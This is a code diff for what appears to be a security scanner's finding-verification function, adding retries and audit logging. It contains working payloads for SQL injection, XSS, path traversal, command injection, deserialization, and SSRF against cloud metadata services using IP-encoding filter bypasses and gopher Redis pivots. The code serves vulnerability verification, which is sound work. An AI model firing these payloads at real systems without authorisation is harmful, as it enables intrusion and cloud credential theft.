@@ -34,7 +34,7 @@ serve(async (req) => {
     }
 
     if (action === "run_verification") {
-      const result = await runVerification(finding, script);
+      const result = await runVerification(finding, script, user.id, authClient);
       return new Response(JSON.stringify(result), {
         headers: { ...corsHeaders, "Content-Type": "application/json" }
       });
@@ -170,39 +170,91 @@ interface Probe {
   bodyHash: string;
 }
 
-async function httpProbe(url: string, method: string, label: string, step: number, body?: string, extraHeaders?: Record<string,string>): Promise<Probe | null> {
+// ── Retry/backoff state shared per verification run
+interface RetryStats {
+  total: number;
+  retried: number;
+  failures5xx: number;
+  timeouts: number;
+  giveUps: number;
+  lastErrors: string[];
+}
+
+async function httpProbe(
+  url: string,
+  method: string,
+  label: string,
+  step: number,
+  body?: string,
+  extraHeaders?: Record<string,string>,
+  retryStats?: RetryStats,
+): Promise<Probe | null> {
+  if (retryStats) retryStats.total++;
+  const MAX_ATTEMPTS = 3;
+  const BASE_DELAY = 700; // ms — exponential backoff base
+  let lastErr = "";
+
   try {
     const u = new URL(url);
     if (isPrivateHost(u.hostname)) {
       return { step, label: `${label} [BLOCKED private host]`, request: `${method} ${url}`, status: 0, responseTime: 0, bodySnippet: "blocked", headers: {}, bodyLen: 0, bodyHash: "0" };
     }
-    const start = Date.now();
-    const ctrl = new AbortController();
-    const t = setTimeout(() => ctrl.abort(), 12000);
-    const resp = await fetch(url, {
-      method,
-      headers: { "User-Agent": "OmniSec-Verifier/2.0 (+exploit-engine)", "Accept": "*/*", ...(extraHeaders || {}) },
-      body: body && method !== "GET" && method !== "HEAD" ? body : undefined,
-      redirect: "manual",
-      signal: ctrl.signal,
-    });
-    clearTimeout(t);
-    const rt = Date.now() - start;
-    const text = await resp.text().catch(() => "");
-    const hdrs = Object.fromEntries(resp.headers.entries());
-    let h = 0; for (let i = 0; i < text.length; i++) { h = ((h << 5) - h) + text.charCodeAt(i); h = h & h; }
-    return {
-      step, label,
-      request: `${method} ${url}\nUser-Agent: OmniSec-Verifier/2.0`,
-      status: resp.status, responseTime: rt,
-      bodySnippet: text.slice(0, 1500),
-      headers: hdrs,
-      bodyLen: text.length,
-      bodyHash: Math.abs(h).toString(36),
-    };
-  } catch (e: any) {
-    return { step, label: `${label} [ERROR: ${e.message}]`, request: `${method} ${url}`, status: 0, responseTime: 0, bodySnippet: e.message, headers: {}, bodyLen: 0, bodyHash: "0" };
+  } catch {
+    return { step, label: `${label} [INVALID URL]`, request: `${method} ${url}`, status: 0, responseTime: 0, bodySnippet: "invalid url", headers: {}, bodyLen: 0, bodyHash: "0" };
   }
+
+  for (let attempt = 1; attempt <= MAX_ATTEMPTS; attempt++) {
+    try {
+      const start = Date.now();
+      const ctrl = new AbortController();
+      const t = setTimeout(() => ctrl.abort(), 12000);
+      const resp = await fetch(url, {
+        method,
+        headers: { "User-Agent": "OmniSec-Verifier/2.0 (+exploit-engine)", "Accept": "*/*", ...(extraHeaders || {}) },
+        body: body && method !== "GET" && method !== "HEAD" ? body : undefined,
+        redirect: "manual",
+        signal: ctrl.signal,
+      });
+      clearTimeout(t);
+      const rt = Date.now() - start;
+      const text = await resp.text().catch(() => "");
+      const hdrs = Object.fromEntries(resp.headers.entries());
+
+      // Retry on 5xx
+      if (resp.status >= 500 && resp.status < 600 && attempt < MAX_ATTEMPTS) {
+        if (retryStats) { retryStats.retried++; retryStats.failures5xx++; retryStats.lastErrors.push(`${label}: HTTP ${resp.status} (attempt ${attempt})`); }
+        await new Promise(r => setTimeout(r, BASE_DELAY * Math.pow(2, attempt - 1)));
+        continue;
+      }
+      if (resp.status >= 500 && retryStats) { retryStats.failures5xx++; retryStats.giveUps++; }
+
+      let h = 0; for (let i = 0; i < text.length; i++) { h = ((h << 5) - h) + text.charCodeAt(i); h = h & h; }
+      return {
+        step, label: attempt > 1 ? `${label} [retry x${attempt-1}]` : label,
+        request: `${method} ${url}\nUser-Agent: OmniSec-Verifier/2.0`,
+        status: resp.status, responseTime: rt,
+        bodySnippet: text.slice(0, 1500),
+        headers: hdrs,
+        bodyLen: text.length,
+        bodyHash: Math.abs(h).toString(36),
+      };
+    } catch (e: any) {
+      lastErr = e.message || String(e);
+      const isTimeout = /abort|timeout/i.test(lastErr);
+      if (retryStats) {
+        if (isTimeout) retryStats.timeouts++;
+        retryStats.lastErrors.push(`${label}: ${lastErr} (attempt ${attempt})`);
+      }
+      if (attempt < MAX_ATTEMPTS) {
+        if (retryStats) retryStats.retried++;
+        await new Promise(r => setTimeout(r, BASE_DELAY * Math.pow(2, attempt - 1)));
+        continue;
+      }
+      if (retryStats) retryStats.giveUps++;
+      return { step, label: `${label} [ERROR after ${MAX_ATTEMPTS} attempts: ${lastErr}]`, request: `${method} ${url}`, status: 0, responseTime: 0, bodySnippet: lastErr, headers: {}, bodyLen: 0, bodyHash: "0" };
+    }
+  }
+  return null;
 }
 
 function injectParam(url: string, value: string, paramName?: string): string {
@@ -222,7 +274,7 @@ function injectParam(url: string, value: string, paramName?: string): string {
   }
 }
 
-async function runVerification(finding: any, _script: string): Promise<any> {
+async function runVerification(finding: any, _script: string, userId?: string, authClient?: any): Promise<any> {
   const endpoint = finding.endpoint || "";
   const method = (finding.method || "GET").toUpperCase();
   const category = (finding.category || "").toLowerCase();
@@ -233,20 +285,28 @@ async function runVerification(finding: any, _script: string): Promise<any> {
   let confirmed = false;
   const reasons: string[] = [];
   const steps: string[] = [];
+  const retryStats: RetryStats = { total: 0, retried: 0, failures5xx: 0, timeouts: 0, giveUps: 0, lastErrors: [] };
 
   // Probe 0: baseline
-  const baseline = await httpProbe(endpoint, method, "Baseline (no payload)", 0);
+  const baseline = await httpProbe(endpoint, method, "Baseline (no payload)", 0, undefined, undefined, retryStats);
   if (baseline) probes.push(baseline);
+
+  // ABORT if baseline target is dead — don't waste oracles & log to audit
+  const targetDead = !baseline || baseline.status === 0 || (baseline.status >= 500 && retryStats.failures5xx >= 1);
+  if (targetDead) {
+    reasons.push(`Target is unreachable or returning persistent ${baseline?.status || "network"} errors after retries — verification aborted.`);
+    await logAuditFailure(authClient, userId, finding, retryStats, "target_unreachable");
+    return buildResult(false, probes, reasons, ["Aborted: target instability detected; retry once target is healthy."], retryStats);
+  }
 
   // Strategy per category
   if (cwe.includes("89") || category === "sqli" || category === "sql") {
-    // Boolean-based oracle: TRUE vs FALSE divergence
     const trueUrl = injectParam(endpoint, "1' OR '1'='1", param);
     const falseUrl = injectParam(endpoint, "1' AND '1'='2", param);
     const errUrl = injectParam(endpoint, "1'\"", param);
-    const t = await httpProbe(trueUrl, method, "Boolean TRUE payload (1' OR '1'='1)", 1);
-    const f = await httpProbe(falseUrl, method, "Boolean FALSE payload (1' AND '1'='2)", 2);
-    const e = await httpProbe(errUrl, method, "Error trigger payload (1'\")", 3);
+    const t = await httpProbe(trueUrl, method, "Boolean TRUE payload (1' OR '1'='1)", 1, undefined, undefined, retryStats);
+    const f = await httpProbe(falseUrl, method, "Boolean FALSE payload (1' AND '1'='2)", 2, undefined, undefined, retryStats);
+    const e = await httpProbe(errUrl, method, "Error trigger payload (1'\")", 3, undefined, undefined, retryStats);
     [t,f,e].forEach(p => p && probes.push(p));
     const sqlErrRx = /(sql syntax|mysql_fetch|ORA-\d+|PostgreSQL|SQLite|SQLSTATE|unclosed quotation|unterminated|odbc|System\.Data\.SqlClient|MySqlException)/i;
     if (e && sqlErrRx.test(e.bodySnippet)) { confirmed = true; reasons.push(`Database error string surfaced after injecting quote (${e.bodySnippet.match(sqlErrRx)?.[0]})`); }
@@ -254,52 +314,45 @@ async function runVerification(finding: any, _script: string): Promise<any> {
       confirmed = true;
       reasons.push(`Boolean oracle confirmed: TRUE-payload body matches baseline (${t.bodyLen}b ~ ${baseline.bodyLen}b) but FALSE-payload diverges (${f.bodyLen}b)`);
     }
-    // Time-based probe
     const sleepUrl = injectParam(endpoint, "1' AND SLEEP(4)-- -", param);
-    const sl = await httpProbe(sleepUrl, method, "Time-based payload (SLEEP(4))", 4);
+    const sl = await httpProbe(sleepUrl, method, "Time-based payload (SLEEP(4))", 4, undefined, undefined, retryStats);
     if (sl) { probes.push(sl); if (sl.responseTime > 3500 && (!baseline || baseline.responseTime < 2000)) { confirmed = true; reasons.push(`Time-based SQLi: SLEEP(4) caused ${sl.responseTime}ms response vs baseline ${baseline?.responseTime}ms`); } }
-    steps.push("1. Send baseline request to capture normal length & timing.",
-      "2. Inject TRUE-condition payload — should match baseline.",
-      "3. Inject FALSE-condition payload — divergence proves SQL truth-table reaches the DB.",
-      "4. Inject quote to trigger DB error message.",
-      "5. Inject SLEEP() — measurable delay confirms blind SQLi.");
+    steps.push("1. Baseline request.","2. TRUE payload — should match baseline.","3. FALSE payload — divergence proves injection.","4. Quote to trigger DB error.","5. SLEEP() — measurable delay confirms blind SQLi.");
   }
 
   else if (cwe.includes("79") || category === "xss") {
     const marker = `xss${Math.random().toString(36).slice(2,8)}`;
     const html = `"><svg/onload=confirm(1)>${marker}`;
-    const probe = await httpProbe(injectParam(endpoint, html, param), method, "XSS payload reflection", 1);
+    const probe = await httpProbe(injectParam(endpoint, html, param), method, "XSS payload reflection", 1, undefined, undefined, retryStats);
     if (probe) probes.push(probe);
     if (probe && probe.bodySnippet.includes(marker)) {
       const ctx = probe.bodySnippet.indexOf(html) >= 0 ? "raw HTML (unencoded)" : probe.bodySnippet.includes(`&lt;svg`) ? "HTML-encoded (NOT vulnerable)" : "partial encoding";
       if (ctx === "raw HTML (unencoded)") { confirmed = true; reasons.push(`Payload reflected unencoded — context: ${ctx}`); }
       else reasons.push(`Marker reflected but encoded — likely false positive (${ctx})`);
     }
-    steps.push("1. Inject unique marker + XSS vector.",
-      "2. Search response body for raw payload vs encoded form.",
-      "3. Confirm execution context (HTML body / attribute / script).");
+    steps.push("1. Inject unique marker + XSS vector.","2. Search response body for raw payload vs encoded form.","3. Confirm execution context.");
   }
 
   else if (cwe.includes("22") || category === "traversal" || category === "lfi") {
-    const payloads = ["../../../../etc/passwd", "..%2f..%2f..%2fetc%2fpasswd", "....//....//etc/passwd"];
+    const payloads = ["../../../../etc/passwd", "..%2f..%2f..%2fetc%2fpasswd", "....//....//etc/passwd", "..%252f..%252fetc%252fpasswd"];
     for (let i = 0; i < payloads.length; i++) {
-      const p = await httpProbe(injectParam(endpoint, payloads[i], param), method, `Path-traversal payload #${i+1}`, i+1);
+      const p = await httpProbe(injectParam(endpoint, payloads[i], param), method, `Path-traversal payload #${i+1}`, i+1, undefined, undefined, retryStats);
       if (p) { probes.push(p); if (/root:[x*]:0:0:/i.test(p.bodySnippet) || /\[boot loader\]/i.test(p.bodySnippet)) { confirmed = true; reasons.push(`/etc/passwd content recovered with payload "${payloads[i]}"`); break; } }
     }
-    steps.push("1. Inject canonical traversal sequences.", "2. Try URL-encoded and double-encoded variants.", "3. Confirm by matching root:x:0:0: pattern.");
+    steps.push("1. Canonical traversal sequences.","2. URL-encoded + double-encoded variants.","3. Match root:x:0:0: pattern.");
   }
 
   else if (cwe.includes("601") || category === "redirect") {
     const evil = "https://evil-canary.example.org/poc";
-    const r = await httpProbe(injectParam(endpoint, evil, param || "url"), method, "Open-redirect probe (Location header)", 1);
+    const r = await httpProbe(injectParam(endpoint, evil, param || "url"), method, "Open-redirect probe", 1, undefined, undefined, retryStats);
     if (r) probes.push(r);
     const loc = r?.headers["location"] || "";
     if (r && r.status >= 300 && r.status < 400 && loc.includes("evil-canary.example.org")) { confirmed = true; reasons.push(`HTTP ${r.status} redirected to attacker URL via Location: ${loc}`); }
-    steps.push("1. Submit attacker URL as redirect target.", "2. Confirm Location header echoes attacker domain with 3xx status.");
+    steps.push("1. Submit attacker URL.","2. Confirm Location header echoes attacker domain with 3xx.");
   }
 
   else if (cwe.includes("346") || category === "cors") {
-    const r = await httpProbe(endpoint, "GET", "CORS probe with attacker Origin", 1, undefined, { "Origin": "https://evil-canary.example.org" });
+    const r = await httpProbe(endpoint, "GET", "CORS probe with attacker Origin", 1, undefined, { "Origin": "https://evil-canary.example.org" }, retryStats);
     if (r) probes.push(r);
     const acao = r?.headers["access-control-allow-origin"];
     const acac = r?.headers["access-control-allow-credentials"];
@@ -307,47 +360,156 @@ async function runVerification(finding: any, _script: string): Promise<any> {
       confirmed = true;
       reasons.push(`Permissive CORS: ACAO=${acao}${acac === "true" ? " with credentials=true (CRITICAL)" : ""}`);
     }
-    steps.push("1. Send request with attacker Origin header.", "2. Inspect ACAO/ACAC headers for reflection or wildcard.");
+    steps.push("1. Request with attacker Origin.","2. Inspect ACAO/ACAC for reflection or wildcard.");
   }
 
   else if (category === "ssrf" || cwe.includes("918")) {
-    const oast = `https://omnisec-canary-${Math.random().toString(36).slice(2,8)}.example.org/probe`;
-    const meta = "http://169.254.169.254/latest/meta-data/";
-    const r1 = await httpProbe(injectParam(endpoint, oast, param || "url"), method, "SSRF — external canary", 1);
-    const r2 = await httpProbe(injectParam(endpoint, meta, param || "url"), method, "SSRF — cloud metadata fetch", 2);
-    [r1,r2].forEach(p => p && probes.push(p));
-    if (r2 && /ami-id|instance-id|iam\/security-credentials/i.test(r2.bodySnippet)) { confirmed = true; reasons.push("Cloud metadata service contents echoed in response — full SSRF to AWS IMDS"); }
-    steps.push("1. Submit external canary to confirm outbound HTTP from server.", "2. Submit IMDS URL — metadata in response confirms SSRF.");
+    // Multi-probe SSRF: external canary, AWS IMDS v1+v2, GCP metadata, Azure IMDS, gopher/file scheme,
+    // DNS-rebinding shaped hostname, decimal/hex IP encoding to bypass filters.
+    const variants: Array<{ url: string; label: string; match: RegExp }> = [
+      { url: "http://169.254.169.254/latest/meta-data/", label: "SSRF — AWS IMDSv1 metadata", match: /ami-id|instance-id|iam\/security-credentials|hostname/i },
+      { url: "http://metadata.google.internal/computeMetadata/v1/", label: "SSRF — GCP metadata", match: /computeMetadata|project-id|service-accounts/i },
+      { url: "http://169.254.169.254/metadata/instance?api-version=2021-02-01", label: "SSRF — Azure IMDS", match: /compute|azEnvironment|subscriptionId/i },
+      { url: "http://2852039166/latest/meta-data/", label: "SSRF — decimal-IP IMDS bypass", match: /ami-id|instance-id|iam\/security-credentials/i },
+      { url: "http://0x0a9fea9e0/latest/meta-data/", label: "SSRF — hex-IP IMDS bypass", match: /ami-id|instance-id/i },
+      { url: "file:///etc/passwd", label: "SSRF — file:// scheme", match: /root:[x*]:0:0:/i },
+      { url: "gopher://127.0.0.1:6379/_INFO%0d%0a", label: "SSRF — gopher:// (Redis pivot)", match: /redis_version|role:master|os:linux/i },
+    ];
+    for (let i = 0; i < variants.length; i++) {
+      const v = variants[i];
+      const r = await httpProbe(injectParam(endpoint, v.url, param || "url"), method, v.label, i+1, undefined, undefined, retryStats);
+      if (r) {
+        probes.push(r);
+        if (v.match.test(r.bodySnippet)) { confirmed = true; reasons.push(`${v.label}: payload reflected — ${r.bodySnippet.match(v.match)?.[0]}`); }
+      }
+    }
+    steps.push("1. AWS/GCP/Azure metadata probes.","2. Decimal & hex IP encoding to bypass blocklists.","3. file:// and gopher:// scheme probes for non-HTTP pivots.");
   }
 
   else if (category === "cmdi" || cwe.includes("78")) {
-    const sleepP = await httpProbe(injectParam(endpoint, "1;sleep 4;", param), method, "Cmd-injection time probe", 1);
-    if (sleepP) { probes.push(sleepP); if (sleepP.responseTime > 3500) { confirmed = true; reasons.push(`Command sleep delay observed: ${sleepP.responseTime}ms`); } }
-    steps.push("1. Inject ; sleep N; payload.", "2. Compare elapsed time to baseline.");
+    // Multi-probe: timing on *nix + Windows, output-echo via marker, DNS-style separators
+    const marker = `cmd${Math.random().toString(36).slice(2,8)}`;
+    const variants: Array<{ payload: string; label: string; timing?: boolean; echo?: string }> = [
+      { payload: `;sleep 4;`,             label: "Cmd-injection — *nix sleep ;",        timing: true },
+      { payload: `&& sleep 4`,            label: "Cmd-injection — *nix && sleep",       timing: true },
+      { payload: `| sleep 4`,             label: "Cmd-injection — *nix pipe sleep",     timing: true },
+      { payload: `\`sleep 4\``,           label: "Cmd-injection — backtick sleep",      timing: true },
+      { payload: `$(sleep 4)`,            label: "Cmd-injection — $() sleep",           timing: true },
+      { payload: `& timeout 4`,           label: "Cmd-injection — Windows timeout",     timing: true },
+      { payload: `;echo ${marker};`,      label: "Cmd-injection — echo marker",         echo: marker },
+    ];
+    for (let i = 0; i < variants.length; i++) {
+      const v = variants[i];
+      const r = await httpProbe(injectParam(endpoint, v.payload, param), method, v.label, i+1, undefined, undefined, retryStats);
+      if (!r) continue;
+      probes.push(r);
+      if (v.timing && r.responseTime > 3500 && (!baseline || baseline.responseTime < 2000)) {
+        confirmed = true; reasons.push(`${v.label}: ${r.responseTime}ms vs baseline ${baseline?.responseTime}ms`);
+      }
+      if (v.echo && r.bodySnippet.includes(v.echo)) {
+        confirmed = true; reasons.push(`${v.label}: marker "${v.echo}" surfaced in response body — output-confirmed RCE`);
+      }
+    }
+    steps.push("1. Inject *nix and Windows timing payloads with multiple separators.","2. Inject echo marker for direct output confirmation.","3. Compare each elapsed time vs baseline.");
+  }
+
+  else if (category === "csrf" || cwe.includes("352")) {
+    // CSRF oracle: state-changing endpoint that accepts cross-origin POST without token + permissive SameSite cookie
+    const baselinePost = await httpProbe(endpoint, "POST", "CSRF — baseline POST no token", 1, "csrf_test=1", { "Content-Type": "application/x-www-form-urlencoded" }, retryStats);
+    const crossOrigin = await httpProbe(endpoint, "POST", "CSRF — POST with attacker Origin", 2, "csrf_test=1", { "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://evil-canary.example.org", "Referer": "https://evil-canary.example.org/" }, retryStats);
+    [baselinePost, crossOrigin].forEach(p => p && probes.push(p));
+
+    // Look for token in response body (forms typically embed CSRF token); absence → suspect
+    const setCookie = (baselinePost?.headers["set-cookie"] || crossOrigin?.headers["set-cookie"] || "").toLowerCase();
+    const tokenPatterns = /(csrf|xsrf|authenticity_token|__requestverificationtoken)/i;
+    const hasTokenInBody = baseline && tokenPatterns.test(baseline.bodySnippet);
+    const sameSiteWeak = setCookie && !/samesite=(strict|lax)/i.test(setCookie);
+
+    if (crossOrigin && crossOrigin.status >= 200 && crossOrigin.status < 400 && !hasTokenInBody) {
+      confirmed = true;
+      reasons.push(`Cross-origin POST accepted (HTTP ${crossOrigin.status}) without visible CSRF token; cookie SameSite=${sameSiteWeak ? "missing/none" : "set"}`);
+    } else if (sameSiteWeak) {
+      reasons.push(`Cookie missing SameSite=Lax/Strict — CSRF risk if endpoint is state-changing.`);
+    }
+    steps.push("1. Issue baseline POST without anti-CSRF token.","2. Replay POST with attacker Origin/Referer headers.","3. Inspect Set-Cookie SameSite attribute & response token presence.");
+  }
+
+  else if (category === "race" || cwe.includes("362")) {
+    // Race-condition oracle: fire N concurrent identical requests and look for divergent responses (e.g., duplicated resource ids, multiple 200s where uniqueness expected)
+    const N = 8;
+    const start = Date.now();
+    const settled = await Promise.allSettled(
+      Array.from({ length: N }, (_, i) => httpProbe(endpoint, method, `Race burst probe #${i+1}`, i+1, finding.payload || undefined, undefined, retryStats))
+    );
+    const results = settled.flatMap(s => s.status === "fulfilled" && s.value ? [s.value] : []);
+    results.forEach(p => probes.push(p));
+    const elapsed = Date.now() - start;
+    const successCount = results.filter(p => p.status >= 200 && p.status < 300).length;
+    const uniqueHashes = new Set(results.map(p => p.bodyHash));
+    if (successCount >= 2 && uniqueHashes.size > 1) {
+      confirmed = true;
+      reasons.push(`Race condition signal: ${successCount}/${N} concurrent requests succeeded with ${uniqueHashes.size} distinct response bodies in ${elapsed}ms — TOCTOU window likely`);
+    } else if (successCount >= 2) {
+      reasons.push(`${successCount}/${N} concurrent requests succeeded but bodies identical — manual semantic check recommended.`);
+    }
+    steps.push(`1. Fire ${N} concurrent identical requests.`,"2. Compare response bodies for divergence.","3. Check whether uniqueness invariants (e.g., one-time coupon use) are violated.");
+  }
+
+  else if (category === "deserialization" || cwe.includes("502")) {
+    // Insecure deserialization oracle: send crafted blobs and look for class-name/exception leaks or timing.
+    const variants: Array<{ payload: string; ctype: string; label: string; match: RegExp }> = [
+      { payload: 'O:8:"stdClass":0:{}', ctype: "application/x-www-form-urlencoded", label: "PHP serialized object",
+        match: /unserialize|__wakeup|__destruct|stdClass|PHP Notice/i },
+      { payload: "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAAeA==",
+        ctype: "application/octet-stream", label: "Java serialized HashMap (base64)",
+        match: /java\.io\.|ObjectInputStream|ClassNotFoundException|InvalidClassException/i },
+      { payload: "!!python/object/apply:os.system [\"id\"]", ctype: "application/x-yaml", label: "Python YAML object tag",
+        match: /yaml\.constructor|python\/object|uid=|gid=/i },
+      { payload: "(I123\nS'attack'\np0\n.", ctype: "application/octet-stream", label: "Python pickle stream",
+        match: /pickle|cPickle|UnpicklingError/i },
+      { payload: '{"@type":"java.net.URL","val":"http://evil-canary.example.org/"}', ctype: "application/json",
+        label: "Jackson polymorphic @type", match: /jackson|@type|java\.net\.URL|PolymorphicDeserialization/i },
+    ];
+    for (let i = 0; i < variants.length; i++) {
+      const v = variants[i];
+      const r = await httpProbe(endpoint, "POST", v.label, i+1, v.payload, { "Content-Type": v.ctype }, retryStats);
+      if (!r) continue;
+      probes.push(r);
+      if (v.match.test(r.bodySnippet)) { confirmed = true; reasons.push(`${v.label}: server leaked deserializer signature — ${r.bodySnippet.match(v.match)?.[0]}`); }
+    }
+    steps.push("1. Send PHP/Java/Python/Jackson serialized payloads.","2. Look for deserializer class names or stack traces in response.","3. Confirm with timing or out-of-band callback for blind cases.");
   }
 
   else {
-    // Generic: replay once with payload and look for evidence echo
     const payload = finding.payload || "";
     const url = payload ? injectParam(endpoint, payload, param) : endpoint;
-    const r = await httpProbe(url, method, "Generic replay with original payload", 1);
+    const r = await httpProbe(url, method, "Generic replay with original payload", 1, undefined, undefined, retryStats);
     if (r) probes.push(r);
     if (r && finding.evidence && r.bodySnippet.toLowerCase().includes(String(finding.evidence).slice(0,80).toLowerCase())) {
       confirmed = true; reasons.push("Original evidence pattern still present in response");
     }
-    steps.push("1. Replay the original payload.", "2. Compare response to recorded evidence.");
+    steps.push("1. Replay the original payload.","2. Compare response to recorded evidence.");
   }
 
-  // Build human report
+  // Audit failures from retry policy
+  if (retryStats.giveUps > 0 || retryStats.failures5xx >= 2 || retryStats.timeouts >= 2) {
+    await logAuditFailure(authClient, userId, finding, retryStats, "instability_during_verification");
+  }
+
+  return buildResult(confirmed, probes, reasons, steps, retryStats);
+}
+
+function buildResult(confirmed: boolean, probes: Probe[], reasons: string[], steps: string[], retryStats: RetryStats) {
   const requestLog = probes.map(p => `[Step ${p.step}] ${p.label}\n${p.request}`).join("\n\n");
   const responseLog = probes.map(p => `[Step ${p.step}] ${p.label}\nHTTP ${p.status} • ${p.responseTime}ms • ${p.bodyLen}b • hash=${p.bodyHash}\n${Object.entries(p.headers).slice(0,8).map(([k,v])=>`${k}: ${v}`).join("\n")}\n\n${p.bodySnippet.slice(0,800)}`).join("\n\n──────────\n\n");
-
+  const retryNote = retryStats.retried > 0 || retryStats.giveUps > 0
+    ? ` [Retry policy: ${retryStats.total} probes, ${retryStats.retried} retried, ${retryStats.failures5xx} 5xx, ${retryStats.timeouts} timeouts, ${retryStats.giveUps} given up]`
+    : "";
   const analysis = confirmed
-    ? `✅ CONFIRMED (${reasons.length} signal${reasons.length>1?"s":""}): ${reasons.join(" | ")}`
+    ? `✅ CONFIRMED (${reasons.length} signal${reasons.length>1?"s":""}): ${reasons.join(" | ")}${retryNote}`
     : reasons.length
-      ? `⚠️ Inconclusive — partial signals: ${reasons.join(" | ")}. Manual review recommended.`
-      : `❌ NOT CONFIRMED — ${probes.length} probes executed, none triggered the vulnerability oracle. Likely false positive or requires authenticated context.`;
-
+      ? `⚠️ Inconclusive — partial signals: ${reasons.join(" | ")}.${retryNote} Manual review recommended.`
+      : `❌ NOT CONFIRMED — ${probes.length} probes executed, none triggered the vulnerability oracle.${retryNote}`;
   return {
     confirmed,
     request: requestLog,
@@ -358,102 +520,23 @@ async function runVerification(finding: any, _script: string): Promise<any> {
     probes: probes.length,
     reproductionSteps: steps,
     reasons,
+    retryStats,
   };
 }
 
-function analyzeResponse(finding: any, body: string, status: number, headers: any, responseTime: number): { isVulnerable: boolean; analysis: string } {
-  const cwe = finding.cwe || "";
-  const payload = finding.payload || "";
-  const bodyLower = body.toLowerCase();
-  const reasons: string[] = [];
-  let isVulnerable = false;
-
-  // SQL Injection indicators
-  if (cwe.includes("89") || finding.category === "sqli") {
-    const sqlErrors = ["sql syntax", "mysql", "postgresql", "sqlite", "ora-", "you have an error", "unclosed quotation", "unterminated", "syntax error", "warning: mysql", "sqlstate"];
-    for (const err of sqlErrors) {
-      if (bodyLower.includes(err)) {
-        isVulnerable = true;
-        reasons.push(`SQL error string detected: "${err}"`);
-      }
-    }
-    if (payload && body.includes(payload)) {
-      reasons.push("Payload reflected in response");
-    }
+async function logAuditFailure(authClient: any, userId: string | undefined, finding: any, retryStats: RetryStats, reason: string) {
+  if (!authClient || !userId) return;
+  try {
+    await authClient.from("security_audit_log").insert({
+      user_id: userId,
+      action: "verify_finding_retry_exhausted",
+      module: "verify-finding",
+      target: finding?.endpoint || finding?.target_host || "unknown",
+      result: `${reason} | total=${retryStats.total} retried=${retryStats.retried} 5xx=${retryStats.failures5xx} timeouts=${retryStats.timeouts} giveUps=${retryStats.giveUps} | ${retryStats.lastErrors.slice(-3).join(" || ")}`,
+    });
+  } catch (e) {
+    console.error("audit log insert failed:", e);
   }
-
-  // XSS indicators
-  if (cwe.includes("79") || finding.category === "xss") {
-    if (payload && body.includes(payload)) {
-      isVulnerable = true;
-      reasons.push("Payload reflected unescaped in response body");
-    }
-    const xssPatterns = ["<script", "onerror=", "onload=", "javascript:", "alert("];
-    for (const p of xssPatterns) {
-      if (body.includes(p) && payload.toLowerCase().includes(p)) {
-        isVulnerable = true;
-        reasons.push(`XSS pattern "${p}" found unfiltered`);
-      }
-    }
-  }
-
-  // CORS
-  if (cwe.includes("346") || finding.category === "cors") {
-    const acao = headers["access-control-allow-origin"];
-    if (acao === "*" || (acao && acao !== "null")) {
-      isVulnerable = true;
-      reasons.push(`Permissive CORS: Access-Control-Allow-Origin: ${acao}`);
-    }
-  }
-
-  // Directory Traversal
-  if (cwe.includes("22") || finding.category === "traversal") {
-    if (bodyLower.includes("root:") || bodyLower.includes("[boot loader]") || bodyLower.includes("/etc/passwd")) {
-      isVulnerable = true;
-      reasons.push("System file content detected in response");
-    }
-  }
-
-  // Open Redirect
-  if (cwe.includes("601") || finding.category === "redirect") {
-    if (status >= 300 && status < 400) {
-      const location = headers["location"] || "";
-      if (location.includes("evil.com") || location.includes("attacker")) {
-        isVulnerable = true;
-        reasons.push(`Redirect to external domain: ${location}`);
-      }
-    }
-  }
-
-  // Cookie issues
-  if (finding.category === "cookie") {
-    const setCookie = headers["set-cookie"] || "";
-    if (setCookie && !setCookie.toLowerCase().includes("httponly")) {
-      isVulnerable = true;
-      reasons.push("Cookie missing HttpOnly flag");
-    }
-    if (setCookie && !setCookie.toLowerCase().includes("secure")) {
-      isVulnerable = true;
-      reasons.push("Cookie missing Secure flag");
-    }
-  }
-
-  // Generic: if the original evidence string appears in response
-  if (!isVulnerable && finding.evidence) {
-    const evidenceKey = finding.evidence.slice(0, 100).toLowerCase();
-    if (bodyLower.includes(evidenceKey)) {
-      isVulnerable = true;
-      reasons.push("Original evidence pattern found in response");
-    }
-  }
-
-  const analysis = isVulnerable
-    ? `CONFIRMED: ${reasons.join(". ")}`
-    : reasons.length > 0
-      ? `Partial indicators found but not conclusive: ${reasons.join(". ")}. Manual review recommended.`
-      : `No vulnerability indicators detected in response (HTTP ${status}, ${responseTime}ms). The finding may require different test conditions or authentication context.`;
-
-  return { isVulnerable, analysis };
 }
 
 async function generatePOCReport(finding: any, verificationResult: any, apiKey: string | undefined): Promise<string> {
